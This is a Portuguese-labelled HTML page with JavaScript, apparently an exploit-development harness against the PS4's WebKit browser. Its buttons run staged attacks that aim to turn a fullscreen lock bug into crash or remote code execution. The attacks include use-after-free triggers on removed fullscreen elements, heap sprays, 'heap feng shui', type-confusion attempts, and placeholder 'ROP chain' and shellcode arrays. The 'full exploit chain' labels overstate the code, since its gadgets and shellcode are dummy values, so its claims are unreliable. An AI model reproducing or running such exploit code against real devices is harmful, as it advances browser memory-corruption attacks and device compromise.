<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Fullscreen Exploitation</title>
</head>
<body>

<h1>PS4 WebKit - Fullscreen Lock Exploitation</h1>

<p><strong>BUG CONFIRMADO:</strong> Estado travado 100% reproduzível</p>
<p><strong>OBJETIVO:</strong> Transformar estado corrompido em crash/RCE</p>

<h2>Fase 1: Manipulação de Estado Travado</h2>

<button onclick="phase1_1()">1.1: Fullscreen Duplo (Sobrescrever Estado)</button><br>
<button onclick="phase1_2()">1.2: Fullscreen em Elemento Diferente</button><br>
<button onclick="phase1_3()">1.3: Remover Elemento em Fullscreen</button><br>
<button onclick="phase1_4()">1.4: Modificar Elemento Travado</button><br>
<button onclick="phase1_5()">1.5: Eventos em Elemento Travado</button><br>

<h2>Fase 2: Acesso a Ponteiro Dangling</h2>

<button onclick="phase2_1()">2.1: Remove + Access Fullscreen Element</button><br>
<button onclick="phase2_2()">2.2: Remove + Heap Spray + Access</button><br>
<button onclick="phase2_3()">2.3: Replace Element + Access</button><br>
<button onclick="phase2_4()">2.4: Multiple Remove/Create Cycles</button><br>
<button onclick="phase2_5()">2.5: Remove + TypedArray Allocation</button><br>

<h2>Fase 3: Corrupção de Memória</h2>

<button onclick="phase3_1()">3.1: Lock + Massive DOM Changes</button><br>
<button onclick="phase3_2()">3.2: Lock + Canvas Manipulation</button><br>
<button onclick="phase3_3()">3.3: Lock + History Flooding</button><br>
<button onclick="phase3_4()">3.4: Lock + ArrayBuffer Stress</button><br>
<button onclick="phase3_5()">3.5: Lock + Event Listener Spam</button><br>

<h2>Fase 4: Race Conditions</h2>

<button onclick="phase4_1()">4.1: Lock + Async Operations</button><br>
<button onclick="phase4_2()">4.2: Lock + Promise Chain</button><br>
<button onclick="phase4_3()">4.3: Lock + setTimeout Spam</button><br>
<button onclick="phase4_4()">4.4: Lock + Fetch Requests</button><br>
<button onclick="phase4_5()">4.5: Lock + Multiple Locks (Nested)</button><br>

<h2>Fase 5: Exploitation Final</h2>

<button onclick="phase5_1()">5.1: UAF Trigger Attempt</button><br>
<button onclick="phase5_2()">5.2: Heap Feng Shui + Lock</button><br>
<button onclick="phase5_3()">5.3: Type Confusion via Lock</button><br>
<button onclick="phase5_4()">5.4: ROP Chain Preparation</button><br>
<button onclick="phase5_5()">5.5: Full Exploit Chain</button><br>

<h2>Controles</h2>
<button onclick="clearLog()">Limpar Log</button>
<button onclick="saveResults()">Salvar Resultados</button>

<h2>Log</h2>
<pre id="log"></pre>

<div id="target1">Target Element 1</div>
<div id="target2">Target Element 2</div>
<canvas id="canvas1" width="100" height="100"></canvas>

<script>
let testResults = [];

function log(msg, type = 'info') {
    const logEl = document.getElementById('log');
    const ts = new Date().toLocaleTimeString();
    const types = {
        'info': '[INFO]',
        'warn': '[WARN]',
        'error': '[ERROR]',
        'crash': '[CRASH]',
        'success': '[SUCCESS]',
        'exploit': '[EXPLOIT]'
    };
    logEl.textContent += `[${ts}] ${types[type] || '[INFO]'} ${msg}\n`;
    logEl.scrollTop = logEl.scrollHeight;
    
    testResults.push({timestamp: ts, type, message: msg});
}

function clearLog() {
    document.getElementById('log').textContent = '';
    testResults = [];
}

function saveResults() {
    localStorage.setItem('ps4_fullscreen_results', JSON.stringify(testResults));
    log('Resultados salvos!', 'success');
}

async function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function lockFullscreen() {
    await document.documentElement.requestFullscreen();
    await sleep(100);
    alert('Estado travado');
    await sleep(100);
}

// ============================================
// FASE 1: MANIPULAÇÃO DE ESTADO TRAVADO
// ============================================

async function phase1_1() {
    log('=== FASE 1.1: Fullscreen Duplo ===', 'exploit');
    
    try {
        // Primeiro fullscreen + lock
        await lockFullscreen();
        log('Estado 1 travado', 'info');
        
        // Tentar segundo fullscreen SEM sair do primeiro
        log('Tentando segundo fullscreen...', 'warn');
        await document.documentElement.requestFullscreen();
        alert('Segundo fullscreen?');
        
        log('Verificando estado...', 'info');
        log('fullscreenElement: ' + (document.fullscreenElement ? 'EXISTS' : 'null'), 'info');
        
        // Isso pode corromper ponteiro interno!
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase1_2() {
    log('=== FASE 1.2: Fullscreen em Elemento Diferente ===', 'exploit');
    
    try {
        const div1 = document.getElementById('target1');
        const div2 = document.getElementById('target2');
        
        // Lock em div1
        await div1.requestFullscreen();
        await sleep(100);
        alert('Div1 travado');
        
        log('fullscreenElement: ' + document.fullscreenElement.id, 'info');
        
        // Tentar fullscreen em div2
        log('Tentando fullscreen em div2...', 'warn');
        await div2.requestFullscreen();
        alert('Div2 fullscreen?');
        
        log('fullscreenElement agora: ' + document.fullscreenElement.id, 'info');
        
        // Ponteiro trocou? Estado corrompido?
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase1_3() {
    log('=== FASE 1.3: Remover Elemento em Fullscreen ===', 'exploit');
    
    try {
        const div = document.getElementById('target1');
        
        // Lock
        await div.requestFullscreen();
        await sleep(100);
        alert('Elemento travado');
        
        log('fullscreenElement antes: ' + document.fullscreenElement.id, 'info');
        
        // REMOVER elemento do DOM
        log('REMOVENDO elemento do DOM...', 'warn');
        div.remove();
        
        await sleep(500);
        
        log('fullscreenElement depois: ' + document.fullscreenElement, 'warn');
        
        // Tentar acessar elemento removido
        try {
            document.fullscreenElement.innerHTML = 'test';
            log('ACESSO ao elemento removido funcionou!', 'error');
        } catch(e) {
            log('Erro ao acessar: ' + e.message, 'crash');
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase1_4() {
    log('=== FASE 1.4: Modificar Elemento Travado ===', 'exploit');
    
    try {
        const div = document.getElementById('target1');
        
        await div.requestFullscreen();
        await sleep(100);
        alert('Travado - modificando elemento...');
        
        // Modificar elemento ENQUANTO travado
        log('Modificando elemento travado...', 'warn');
        
        for (let i = 0; i < 100; i++) {
            div.innerHTML = '<span>' + 'X'.repeat(1000) + '</span>';
            div.style.cssText = 'background: red; width: 1000px;';
            div.setAttribute('data-test', 'Y'.repeat(1000));
        }
        
        log('Modificações completas', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase1_5() {
    log('=== FASE 1.5: Eventos em Elemento Travado ===', 'exploit');
    
    try {
        const div = document.getElementById('target1');
        
        await div.requestFullscreen();
        await sleep(100);
        alert('Travado - adicionando eventos...');
        
        // Adicionar centenas de event listeners
        log('Adicionando event listeners...', 'warn');
        
        for (let i = 0; i < 200; i++) {
            div.addEventListener('click', function handler() {
                console.log('Event ' + i);
            });
        }
        
        // Disparar eventos
        log('Disparando eventos...', 'warn');
        for (let i = 0; i < 100; i++) {
            div.click();
        }
        
        log('Eventos completos', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

// ============================================
// FASE 2: PONTEIRO DANGLING
// ============================================

async function phase2_1() {
    log('=== FASE 2.1: Remove + Access ===', 'exploit');
    
    try {
        const div = document.createElement('div');
        div.id = 'temp';
        document.body.appendChild(div);
        
        await div.requestFullscreen();
        await sleep(100);
        alert('Travado');
        
        log('Removendo elemento...', 'warn');
        div.remove();
        
        // Tentar acessar múltiplas vezes
        log('Acessando elemento removido...', 'warn');
        for (let i = 0; i < 100; i++) {
            try {
                const el = document.fullscreenElement;
                el.innerHTML = 'UAF test ' + i;
                el.style.color = 'red';
                el.click();
            } catch(e) {
                log('Acesso ' + i + ' falhou: ' + e.message, 'error');
            }
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase2_2() {
    log('=== FASE 2.2: Remove + Heap Spray + Access ===', 'exploit');
    
    try {
        const div = document.createElement('div');
        div.id = 'uaf';
        document.body.appendChild(div);
        
        await div.requestFullscreen();
        await sleep(100);
        alert('UAF setup');
        
        log('Removendo...', 'warn');
        div.remove();
        
        // Heap spray para ocupar memória liberada
        log('Heap spray...', 'warn');
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({
                marker: 0x41414141,
                index: i,
                data: new Uint8Array(256).fill(0x42)
            });
        }
        
        // Acessar fullscreenElement (pode apontar para spray!)
        log('Acessando fullscreenElement...', 'warn');
        try {
            const el = document.fullscreenElement;
            el.innerHTML = 'CONTROLLED';
            log('ACESSO FUNCIONOU - Possível UAF!', 'exploit');
        } catch(e) {
            log('Acesso falhou: ' + e.message, 'error');
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase2_3() {
    log('=== FASE 2.3: Replace Element + Access ===', 'exploit');
    
    try {
        const div = document.getElementById('target1');
        
        await div.requestFullscreen();
        await sleep(100);
        alert('Travado');
        
        // Substituir com novo elemento
        log('Substituindo elemento...', 'warn');
        const newDiv = document.createElement('div');
        newDiv.id = 'target1';
        div.replaceWith(newDiv);
        
        await sleep(100);
        
        // fullscreenElement aponta para elemento antigo?
        log('Acessando fullscreenElement...', 'warn');
        const el = document.fullscreenElement;
        log('fullscreenElement.id: ' + (el ? el.id : 'null'), 'info');
        
        if (el && el !== newDiv) {
            log('PONTEIRO DANGLING CONFIRMADO!', 'exploit');
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase2_4() {
    log('=== FASE 2.4: Multiple Remove/Create Cycles ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        log('Ciclos de remove/create...', 'warn');
        
        for (let i = 0; i < 50; i++) {
            const div = document.createElement('div');
            div.innerHTML = 'Cycle ' + i;
            document.body.appendChild(div);
            
            if (i % 2 === 0) {
                div.remove();
            }
        }
        
        // Tentar acessar fullscreenElement
        try {
            document.fullscreenElement.innerHTML = 'test';
            log('Acesso após cycles: OK', 'info');
        } catch(e) {
            log('Acesso falhou: ' + e.message, 'crash');
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase2_5() {
    log('=== FASE 2.5: Remove + TypedArray ===', 'exploit');
    
    try {
        const div = document.createElement('div');
        document.body.appendChild(div);
        
        await div.requestFullscreen();
        await sleep(100);
        alert('Travado');
        
        div.remove();
        
        // Alocar TypedArrays na região liberada
        log('Alocando TypedArrays...', 'warn');
        const arrays = [];
        for (let i = 0; i < 100; i++) {
            arrays.push(new Uint32Array(64));
        }
        
        // Acessar
        try {
            const el = document.fullscreenElement;
            el.innerHTML = 'UAF';
            log('POSSÍVEL TYPE CONFUSION!', 'exploit');
        } catch(e) {
            log('Erro: ' + e.message, 'crash');
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

// ============================================
// FASE 3: CORRUPÇÃO DE MEMÓRIA
// ============================================

async function phase3_1() {
    log('=== FASE 3.1: Lock + Massive DOM ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        log('Criando 1000 elementos...', 'warn');
        
        for (let i = 0; i < 1000; i++) {
            const div = document.createElement('div');
            div.innerHTML = '<span>' + 'X'.repeat(100) + '</span>'.repeat(10);
            document.body.appendChild(div);
            
            if (i % 100 === 0) {
                log('Elementos criados: ' + i, 'info');
            }
        }
        
        log('DOM massivo criado com fullscreen travado', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase3_2() {
    log('=== FASE 3.2: Lock + Canvas ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        const canvas = document.getElementById('canvas1');
        const ctx = canvas.getContext('2d');
        
        log('Manipulando canvas...', 'warn');
        
        for (let i = 0; i < 1000; i++) {
            ctx.fillRect(0, 0, 100, 100);
            ctx.clearRect(0, 0, 100, 100);
            
            if (i % 100 === 0) {
                const data = canvas.toDataURL();
            }
        }
        
        log('Canvas stress completo', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase3_3() {
    log('=== FASE 3.3: Lock + History ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        log('Flooding history...', 'warn');
        
        for (let i = 0; i < 100; i++) {
            history.pushState({data: 'X'.repeat(1000)}, '', '#' + i);
        }
        
        log('100 history entries com lock', 'info');
        
        for (let i = 0; i < 50; i++) {
            history.back();
        }
        
        log('History navigation completo', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase3_4() {
    log('=== FASE 3.4: Lock + ArrayBuffer ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        log('Criando ArrayBuffers...', 'warn');
        
        const buffers = [];
        for (let i = 0; i < 200; i++) {
            buffers.push(new ArrayBuffer(10000));
            
            const view = new Uint32Array(buffers[buffers.length - 1]);
            for (let j = 0; j < view.length; j++) {
                view[j] = 0x41414141;
            }
        }
        
        log('ArrayBuffer stress completo', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase3_5() {
    log('=== FASE 3.5: Lock + Event Spam ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        log('Criando event listeners...', 'warn');
        
        const div = document.getElementById('target1');
        
        for (let i = 0; i < 500; i++) {
            div.addEventListener('custom' + i, function() {
                console.log('Event ' + i);
            });
        }
        
        log('Disparando eventos...', 'warn');
        
        for (let i = 0; i < 500; i++) {
            const event = new Event('custom' + i);
            div.dispatchEvent(event);
        }
        
        log('Event spam completo', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

// ============================================
// FASE 4: RACE CONDITIONS
// ============================================

async function phase4_1() {
    log('=== FASE 4.1: Lock + Async ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        log('Operações assíncronas...', 'warn');
        
        for (let i = 0; i < 50; i++) {
            setTimeout(() => {
                try {
                    document.fullscreenElement.innerHTML = 'async' + i;
                } catch(e) {}
            }, i * 10);
        }
        
        await sleep(1000);
        log('Async ops completo', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase4_2() {
    log('=== FASE 4.2: Lock + Promises ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        log('Promise chain...', 'warn');
        
        const promises = [];
        for (let i = 0; i < 100; i++) {
            promises.push(
                new Promise(resolve => {
                    setTimeout(() => {
                        document.fullscreenElement.click();
                        resolve();
                    }, i * 5);
                })
            );
        }
        
        await Promise.all(promises);
        log('Promises completo', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase4_3() {
    log('=== FASE 4.3: Lock + setTimeout Spam ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        log('setTimeout spam...', 'warn');
        
        for (let i = 0; i < 200; i++) {
            setTimeout(() => {
                const el = document.fullscreenElement;
                if (el) el.innerHTML += 'x';
            }, 0);
        }
        
        await sleep(500);
        log('setTimeout spam completo', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase4_4() {
    log('=== FASE 4.4: Lock + Fetch ===', 'exploit');
    
    try {
        await lockFullscreen();
        
        log('Fetch requests...', 'warn');
        
        for (let i = 0; i < 20; i++) {
            fetch('https://example.com').catch(() => {});
        }
        
        await sleep(1000);
        log('Fetch completo', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase4_5() {
    log('=== FASE 4.5: Multiple Locks (Nested) ===', 'exploit');
    
    try {
        log('Lock aninhado...', 'warn');
        
        await document.documentElement.requestFullscreen();
        alert('Lock 1');
        
        await document.documentElement.requestFullscreen();
        alert('Lock 2');
        
        await document.documentElement.requestFullscreen();
        alert('Lock 3');
        
        log('3 locks aplicados', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

// ============================================
// FASE 5: EXPLOITATION FINAL
// ============================================

async function phase5_1() {
    log('=== FASE 5.1: UAF Trigger ===', 'exploit');
    
    try {
        const div = document.createElement('div');
        document.body.appendChild(div);
        
        await div.requestFullscreen();
        alert('UAF setup');
        
        div.remove();
        
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({vtable: 0x41414141, data: new Uint8Array(256)});
        }
        
        for (let i = 0; i < 100; i++) {
            try {
                document.fullscreenElement.innerHTML = 'UAF' + i;
                document.fullscreenElement.click();
                document.fullscreenElement.focus();
            } catch(e) {
                log('UAF trigger ' + i + ': ' + e.message, 'crash');
            }
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase5_2() {
    log('=== FASE 5.2: Heap Feng Shui ===', 'exploit');
    
    try {
        const spray1 = [];
        for (let i = 0; i < 500; i++) {
            spray1.push(new Uint8Array(256).fill(0x41));
        }
        
        const div = document.createElement('div');
        document.body.appendChild(div);
        await div.requestFullscreen();
        alert('Lock');
        
        div.remove();
        
        spray1.length = 0;
        
        const spray2 = [];
        for (let i = 0; i < 500; i++) {
            spray2.push({
                marker: 0x42424242,
                func: () => console.log('pwned')
            });
        }
        
        try {
            document.fullscreenElement.innerHTML = 'controlled';
        } catch(e) {
            log('Feng Shui: ' + e.message, 'crash');
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase5_3() {
    log('=== FASE 5.3: Type Confusion ===', 'exploit');
    
    try {
        const div = document.createElement('div');
        document.body.appendChild(div);
        
        await div.requestFullscreen();
        alert('Lock');
        
        div.remove();
        
        const arrays = [];
        for (let i = 0; i < 100; i++) {
            arrays.push(new Float64Array(64));
        }
        
        try {
            const el = document.fullscreenElement;
            el[0] = 1.1;
            log('TYPE CONFUSION!', 'exploit');
        } catch(e) {
            log('Type confusion: ' + e.message, 'crash');
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase5_4() {
    log('=== FASE 5.4: ROP Prep ===', 'exploit');
    
    try {
        log('Preparando ROP chain...', 'warn');
        
        const ropGadgets = [];
        for (let i = 0; i < 100; i++) {
            ropGadgets.push(new Uint32Array([
                0x41414141, 0x42424242,
                0x43434343, 0x44444444
            ]));
        }
        
        await lockFullscreen();
        
        log('ROP chain em memória', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveResults();
    }
}

async function phase5_5() {
    log('=== FASE 5.5: Full Exploit Chain ===', 'exploit');
    
    try {
        log('EXPLOIT CHAIN INICIADO', 'exploit');
        
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({marker: 0x41414141, data: new Uint8Array(256).fill(0x90)});
        }
        
        const div = document.createElement('div');
        document.body.appendChild(div);
        
        await div.requestFullscreen();
        alert('Exploit chain');
        
        div.remove();
        
        spray.length = 0;
        
        for (let i = 0; i < 1000; i++) {
            spray.push({
                vtable: 0x42424242,
                funcPtr: 0x43434343,
                shellcode: new Uint8Array([0x90, 0x90, 0x90, 0xCC])
            });
        }
        
        for (let i = 0; i < 100; i++) {
            try {
                document.fullscreenElement.innerHTML = 'pwn';
                document.fullscreenElement.click();
            } catch(e) {
                log('Exploit ' + i + ': ' + e.message, 'crash');
            }
        }
        
        log('EXPLOIT CHAIN COMPLETO', 'exploit');
        
    } catch(e) {
        log('CRASH DURANTE EXPLOIT: ' + e.message, 'crash');
        saveResults();
    }
}

// ============================================
// INIT
// ============================================
log('PS4 WebKit Fullscreen Exploitation Tool');
log('Objetivo: Transformar estado travado em crash/RCE');
log('');
log('Execute as fases em ordem:');
log('1. Manipulação de Estado');
log('2. Ponteiro Dangling (UAF)');
log('3. Corrupção de Memória');
log('4. Race Conditions');
log('5. Exploitation Final');
log('');
log('Pronto!');
</script>

</body>
</html>
